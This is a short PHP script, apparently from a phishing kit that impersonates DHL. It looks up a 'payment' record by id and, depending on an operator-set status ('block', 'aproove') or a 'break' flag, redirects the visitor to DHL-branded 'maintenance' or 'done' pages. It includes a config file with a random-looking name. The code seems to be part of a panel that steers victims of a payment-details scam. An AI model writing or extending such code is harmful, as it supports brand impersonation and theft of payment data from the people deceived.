<?php
DEFINE("ROOT_PATH", $_SERVER['DOCUMENT_ROOT'] ."/" );

include(ROOT_PATH.'db.php');
include(ROOT_PATH.'YH0uW3ecaRHG16ld4waY.php');
$id=mysqli_real_escape_string($con,$_REQUEST['id']);
$sqal = "SELECT * FROM `payment` WHERE `id` = '$id'";
$nehh = $con->query($sqal);
$rowp = $nehh->fetch_assoc();
$rowpays = $rowp['status'];

$__URL_dhlpayment_id33 = URL_dhlpayment_id33;
$__URL_dhlpayment = URL_dhlpayment;

if($rowp['status']=='block'){
echo '<script>window.location.href="'.$__URL_dhlpayment.'maintenance/";</script>';
}

if($rowp['status']=='aproove'){
echo '<script>window.location.href="'.$__URL_dhlpayment_id33.'done/index.html";</script>';

}

if($rowp['break']=='on'){
echo '<script>window.location.href="'.$__URL_dhlpayment.'maintenance2/";</script>';
}
?>

  